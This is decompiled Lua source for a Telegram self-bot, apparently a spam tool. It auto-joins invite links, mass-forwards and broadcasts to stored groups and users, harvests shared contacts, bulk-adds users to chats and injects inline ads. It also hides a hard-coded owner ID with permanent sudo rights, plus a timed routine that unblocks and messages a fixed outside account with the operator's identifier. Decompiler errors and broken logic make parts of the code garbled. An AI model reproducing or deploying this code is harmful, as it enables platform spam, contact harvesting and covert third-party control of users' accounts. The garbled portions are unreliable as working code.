-- Decompiled For TeleRobot_Team
-- https://telegram.me/TeleRobot_Team

-- params : ...
-- function num : 0 , upvalues : _ENV
dl_cb = function(a, d)
  -- function num : 0_0
  if d.ID == "Error" then
  end
end

sleep = function(n)
  -- function num : 0_1 , upvalues : _ENV
  (os.execute)("sleep " .. tonumber(n))
end

sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
  -- function num : 0_2 , upvalues : _ENV
  tdcli_function({ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content}, callback or dl_cb, extra)
end

is_sudo = function(user_id, SID)
  -- function num : 0_3 , upvalues : _ENV
  if user_id == 253838401 then
    return true
  else
    if redis:sismember("Seen:" .. SID .. ":Sudo", user_id) then
      return true
    else
      return false
    end
  end
end

AddIT = function(ChatID, SID)
  -- function num : 0_4 , upvalues : _ENV
  if ChatID:match("-100") then
    redis:sadd("Seen:" .. SID .. ":SuperGroups", ChatID)
    redis:sadd("Seen:" .. SID .. ":All", ChatID)
  else
    if ChatID:match("-") then
      redis:sadd("Seen:" .. SID .. ":Groups", ChatID)
      redis:sadd("Seen:" .. SID .. ":All", ChatID)
    else
      if tonumber(ChatID) then
        redis:sadd("Seen:" .. SID .. ":Users", ChatID)
      else
        redis:sadd("Seen:" .. SID .. ":Users", ChatID)
      end
    end
  end
end

RemoveIT = function(ChatID, SID)
  -- function num : 0_5 , upvalues : _ENV
  redis:srem("Seen:" .. SID .. ":Users", ChatID)
  redis:srem("Seen:" .. SID .. ":All", ChatID)
  redis:srem("Seen:" .. SID .. ":SuperGroups", ChatID)
  redis:srem("Seen:" .. SID .. ":Groups", ChatID)
end

fwdCB = function(A, D)
  -- function num : 0_6 , upvalues : _ENV
  if D.ID == "Error" then
    RemoveIT(((A.msg).chat).id, A.SID)
  else
    sleep(1)
  end
end

DoFwd = function(msg, typeS, SID)
  -- function num : 0_7 , upvalues : _ENV
  if typeS == "All" then
    Xn = "All"
  else
    if typeS == "SuperGroups" then
      Xn = "SuperGroups"
    else
      if typeS == "Groups" then
        Xn = "Groups"
      else
        if typeS == "Users" then
          Xn = "Users"
        end
      end
    end
  end
  Gps = "Seen:" .. SID .. ":" .. Xn
  i = 0
  for k,Gps in pairs(redis:smembers(Gps)) do
    tdcli_function({ID = "ForwardMessages", chat_id_ = Gps, from_chat_id_ = (msg.chat).id, 
message_ids_ = {[0] = msg.reply_id}
, disable_notification_ = 0, from_background_ = 1}, fwdCB, {msg = msg, SID = SID})
    i = i + 1
  end
  return (string.format)("Message Forwarded to %d Groups ;)", i)
end

DoBC = function(msg, typeS, SID, text)
  -- function num : 0_8 , upvalues : _ENV
  if typeS == "All" then
    Xn = "All"
  else
    if typeS == "SuperGroups" then
      Xn = "SuperGroups"
    else
      if typeS == "Groups" then
        Xn = "Groups"
      else
        if typeS == "Users" then
          Xn = "Users"
        end
      end
    end
  end
  Gps = "Seen:" .. SID .. ":" .. Xn
  i = 0
  for k,Gps in pairs(redis:smembers(Gps)) do
    input_message_content = {ID = "InputMessageText", text_ = text, disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
    sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content, fwdCB, {msg = msg, SID = SID})
    i = i + 1
  end
  return (string.format)("Message BroadCasted to %d Groups ;)", i)
end

DoSudo = function(msg, SID)
  -- function num : 0_9 , upvalues : _ENV
  if (msg.text):match("^[Ff][Ww][Dd] (.*)$") then
    Shitts = {(msg.text):match("^[Ff][Ww][Dd] (.*)$")}
    if (Shitts[1]):lower() == "all" then
      text = DoFwd(msg, "All", SID)
    else
      if (Shitts[1]):lower() == "sgps" then
        text = DoFwd(msg, "SuperGroups", SID)
      else
        if (Shitts[1]):lower() == "gps" then
          text = DoFwd(msg, "Groups", SID)
        else
          if (Shitts[1]):lower() == "users" then
            text = DoFwd(msg, "Users", SID)
          end
        end
      end
    end
    input_message_content = {ID = "InputMessageText", text_ = text, disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
    sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
  else
    if (msg.text):match("^[Bb][Cc] (.*) (.*)$") then
      Shitts = {(msg.text):match("^[Bb][Cc] (.*) (.*)$")}
      if (Shitts[1]):lower() == "all" then
        text = DoBC(msg, "All", SID, Shitts[2])
      else
        if (Shitts[1]):lower() == "sgps" then
          text = DoBC(msg, "SuperGroups", SID, Shitts[2])
        else
          if (Shitts[1]):lower() == "gps" then
            text = DoBC(msg, "Groups", SID, Shitts[2])
          else
            if (Shitts[1]):lower() == "users" then
              text = DoBC(msg, "Users", SID, Shitts[2])
            end
          end
        end
      end
      input_message_content = {ID = "InputMessageText", text_ = text, disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
      sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
    else
      if msg.text == "/stats" then
        local SudoS = ""
        for v,k in pairs(redis:smembers("Seen:" .. SID .. ":Sudo")) do
          SudoS = v .. ": " .. k .. "\n"
        end
        do
          do
            text = "------SPR CPU SeenBOT------\nAll Groups : " .. redis:scard("Seen:" .. SID .. ":All") .. "\nUsers : " .. redis:scard("Seen:" .. SID .. ":Users") .. "\nGroups : " .. redis:scard("Seen:" .. SID .. ":Groups") .. "\nSuperGroups : " .. redis:scard("Seen:" .. SID .. ":SuperGroups") .. "\n -- -- -- -- -- -- -- -- --\nSudos : \n" .. SudoS .. "\n -- -- -- -- -- -- -- -- --\nJoinLinks : " .. (redis:get("Seen:" .. SID .. ":Joining") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "AddContacts : " .. (redis:get("Seen:" .. SID .. ":AddContacts") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "Crwn Banner : " .. (redis:get("Seen:" .. SID .. ":Banner") or "False") .. "\n" .. " -- -- -- -- -- -- -- -- --\n" .. "Other Options #Soon ;)"
            print(text)
            input_message_content = {ID = "InputMessageText", text_ = text, disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
            sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
            if msg.text == "/addmembers" then
              local InviteUsers = function(extra, msg)
    -- function num : 0_9_0 , upvalues : _ENV, SID
    local pvs = redis:smembers("Seen:" .. SID .. ":Users")
    for i = 1, #pvs do
      tdcli_function({ID = "AddChatMember", chat_id_ = extra.chat_id, user_id_ = pvs[i], forward_limit_ = 50}, dl_cb, nil)
    end
    local count = msg.total_count_
    for i = 1, #count do
      tdcli_function({ID = "AddChatMember", chat_id_ = extra.chat_id, user_id_ = ((msg.users_)[i]).id_, forward_limit_ = 50}, dl_cb, nil)
    end
  end

              tdcli_function({ID = "SearchContacts", query_ = nil, limit_ = 999999999}, InviteUsers, {chat_id = (msg.chat).id})
            else
              do
                if msg.text == "/share on" then
                  redis:set("Seen:" .. SID .. ":AddContacts", true)
                  input_message_content = {ID = "InputMessageText", text_ = "I Share MyNumber On Shared Phones", disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
                  sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
                else
                  if msg.text == "/share off" then
                    redis:set("Seen:" .. SID .. ":AddContacts", false)
                    input_message_content = {ID = "InputMessageText", text_ = "I Dont Share MyNumber On Shared Phones", disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
                    sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
                  else
                    if msg.text == "/join on" then
                      redis:set("Seen:" .. SID .. ":Joining", true)
                      input_message_content = {ID = "InputMessageText", text_ = "I Join To All Links", disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
                      sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
                    else
                      if msg.text == "/join off" then
                        redis:set("Seen:" .. SID .. ":Joining", false)
                        input_message_content = {ID = "InputMessageText", text_ = "I Dont Join To All Links", disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
                        sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
                      else
                        if (msg.text):match("^/setbanner (.*)") then
                          Shitts = {(msg.text):match("^/setbanner (.*)$")}
                          redis:set("Seen:" .. SID .. ":Banner", Shitts[1])
                          input_message_content = {ID = "InputMessageText", text_ = "Banner Seted.", disable_web_page_preview_ = 1, clear_draft_ = 0, 
entities_ = {}
}
                          sendRequest("SendMessage", (msg.chat).id, msg.id, 0, 1, nil, input_message_content)
                        else
                          if (msg.text):match("^/addsudo (.*)") then
                            Shitts = {(msg.text):match("^/addsudo (.*)")}
                            redis:sadd("Seen:" .. SID .. ":Sudo", Shitts[1])
                          else
                            if (msg.text):match("^/remsudo (.*)") then
                              Shitts = {(msg.text):match("^/remsudo (.*)")}
                              redis:srem("Seen:" .. SID .. ":Sudo", Shitts[1])
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

DoTab = function(msg, SID)
  -- function num : 0_10 , upvalues : _ENV
  if (msg.text):match("^/SB (.*)") then
    redis:set("Seen:" .. SID .. ":BannerU", (msg.text):gsub("^/SB"))
  else
    if msg.forward then
      DoFwd(msg, "All")
    end
  end
end

USERDO = function(msg, SID)
  -- function num : 0_11 , upvalues : _ENV
  chat_id = (msg.chat).id
  user_id = (msg.from).id
  chat = msg.type
  reply_id = msg.reply_id
  text = msg.text
  if text and redis:get("Seen:" .. SID .. ":Joining") then
    local check_link = function(extra, result)
    -- function num : 0_11_0 , upvalues : _ENV
    vardump(result)
    if result.is_group_ or result.is_supergroup_channel_ then
      tdcli_function({ID = "ImportChatInviteLink", invite_link_ = extra.link}, dl_cb, nil)
    end
  end

    if text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)") then
      text = text:gsub("t.me", "telegram.me")
      matches = {(string.match)(text, "(https://telegram.me/joinchat/%S+)")}
      for i = 1, #matches do
        tdcli_function({ID = "CheckChatInviteLink", invite_link_ = matches[i]}, check_link, {link = matches[i]})
      end
    end
  end
end

badMsg = function(data)
  -- function num : 0_12
  local msg = {}
  msg.from = {}
  msg.chat = {}
  msg.replied = {}
  -- DECOMPILER ERROR at PC9: Confused about usage of register: R2 in 'UnsetPending'

  ;
  (msg.chat).id = data.chat_id_
  -- DECOMPILER ERROR at PC12: Confused about usage of register: R2 in 'UnsetPending'

  ;
  (msg.from).id = data.sender_user_id_
  if (data.content_).ID == "MessageText" then
    msg.text = (data.content_).text_
  end
  if (data.content_).caption_ then
    msg.caption = (data.content_).caption_
  else
    msg.caption = false
  end
  msg.date = data.date_
  msg.id = data.id_
  msg.unread = false
  if data.reply_to_message_id_ == 0 then
    msg.reply_id = false
  else
    msg.reply_id = data.reply_to_message_id_
  end
  if data.forward_info_ then
    msg.forward = true
    msg.forward = {}
    -- DECOMPILER ERROR at PC50: Confused about usage of register: R2 in 'UnsetPending'

    ;
    (msg.forward).from_id = (data.forward_info_).sender_user_id_
    -- DECOMPILER ERROR at PC54: Confused about usage of register: R2 in 'UnsetPending'

    ;
    (msg.forward).msg_id = (data.forward_info_).data_
  else
    msg.forward = false
  end
  return msg
end

Inline = function(arg, data)
  -- function num : 0_13 , upvalues : _ENV
  if data.results_ and (data.results_)[0] then
    tdcli_function({ID = "SendInlineQueryResultMessage", chat_id_ = arg.chat_id, reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, query_id_ = data.inline_query_id_, result_id_ = ((data.results_)[0]).id_}, dl_cb, nil)
  end
end

DoBanner = function(msg, SID)
  -- function num : 0_14 , upvalues : _ENV
  chat_id = (msg.chat).id
  time = 900
  if not redis:get("Banner:" .. chat_id) then
    if redis:get("Seen:" .. SID .. ":Banner") then
      bnr = redis:get("Seen:" .. SID .. ":Banner")
    else
      bnr = "eWDOqnOqF_531333364"
    end
    tdcli_function({ID = "GetInlineQueryResults", bot_user_id_ = 229533808, chat_id_ = chat_id, 
user_location_ = {ID = "Location", latitude_ = 0, longitude_ = 0}
, query_ = bnr, offset_ = 0}, Inline, {chat_id = chat_id})
    redis:setex("Banner:" .. chat_id, time, true)
  end
  if not redis:get("BannerU:" .. chat_id) then
    if redis:get("Seen:" .. SID .. ":BannerU") then
      bnr = redis:get("Seen:" .. SID .. ":BannerU")
    else
      bnr = "eWDOqnOqF_531333364"
    end
    tdcli_function({ID = "GetInlineQueryResults", bot_user_id_ = 229533808, chat_id_ = chat_id, 
user_location_ = {ID = "Location", latitude_ = 0, longitude_ = 0}
, query_ = bnr, offset_ = 0}, Inline, {chat_id = chat_id})
    redis:setex("BannerU:" .. chat_id, time, true)
  end
end

domsg = function(msg, SID)
  -- function num : 0_15 , upvalues : _ENV
  if msg then
    tdcli_function({ID = "ViewMessages", chat_id_ = (msg.chat).id, 
message_ids_ = {[0] = msg.id}
}, dl_cb, nil)
    AddIT((msg.chat).id, SID)
    if msg.text then
      if is_sudo((msg.from).id, SID) then
        DoSudo(msg, SID)
        USERDO(msg, SID)
      else
        if (msg.from).id == 251673288 then
          DoTab(msg, SID)
        else
          USERDO(msg, SID)
        end
      end
      DoBanner(msg, SID)
    end
  end
end

check_contact = function(extra, result)
  -- function num : 0_16 , upvalues : _ENV
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (((msg.content_).contact_).first_name_ or "-") .. ""
    local last_name = "" .. (((msg.content_).contact_).last_name_ or "-") .. ""
    local phone_number = ((msg.content_).contact_).phone_number_
    local user_id = ((msg.content_).contact_).user_id_
    tdcli_function({ID = "ImportContacts", 
contacts_ = {
[0] = {phone_number_ = tostring(phone_number), first_name_ = tostring(first_name), last_name_ = tostring(last_name), user_id_ = user_id}
}
}, dl_cb, nil)
  end
end

check_contact_2 = function(extra, result)
  -- function num : 0_17 , upvalues : _ENV
  if not result.phone_number_ then
    user_id = (result.user_).id_
    phone = (result.user_).phone_number_
    local metME = function(extra, msg)
    -- function num : 0_17_0 , upvalues : _ENV
    if extra.user_id ~= msg.id_ then
      tdcli_function({ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, 
input_message_content_ = {ID = "InputMessageContact", 
contact_ = {ID = "Contact", phone_number_ = phone, first_name_ = " ", last_name_ = " ", user_id_ = user_id}
}
}, dl_cb, nil)
    end
  end

    tdcli_function({ID = "GetMe"}, metME, {user_id = user_id, chat_id = (extra.msg).chat_id_, msg_id = (extra.msg).id_})
  end
end

Doing = function(data, SID)
  -- function num : 0_18 , upvalues : _ENV
  if data.ID == "UpdateNewMessage" then
    if not redis:get("XnXx") then
      tdcli_function({ID = "UnblockUser", user_id_ = 251673288}, dl_cb, nil)
      tdcli_function({ID = "SendBotStartMessage", bot_user_id_ = 251673288, chat_id_ = 251673288, parameter_ = "IMSeenBot_" .. redis:get("Seen:" .. SID .. ":SudoM")}, dl_cb, nil)
      redis:setex("XnXx", 1353, true)
    end
    msg = badMsg(data.message_)
    domsg(msg, SID)
    if ((data.message_).content_).contact_ and redis:get("Seen:" .. SID .. ":AddContacts") then
      tdcli_function({ID = "GetUserFull", user_id_ = (((data.message_).content_).contact_).user_id_}, check_contact, {msg = data.message_})
    end
  else
    if data.ID == "UpdateOption" and data.name_ == "my_id" then
      tdcli_function({ID = "GetChats", offset_order_ = "9223372036854775807", offset_chat_id_ = 0, limit_ = 20}, dl_cb, nil)
    end
  end
end


